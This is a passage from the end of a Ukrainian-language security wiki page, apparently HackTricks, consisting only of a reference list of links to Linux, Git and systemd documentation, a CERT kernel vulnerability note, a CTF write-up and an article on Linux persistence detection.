- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile криптографічної підсистеми Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: вразливість кешу сторінок AF_ALG у Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Документація Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Документація Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Документація конфігурації Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Документація генераторів systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — інженерія виявлення загроз у Linux: механізми закріплення](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
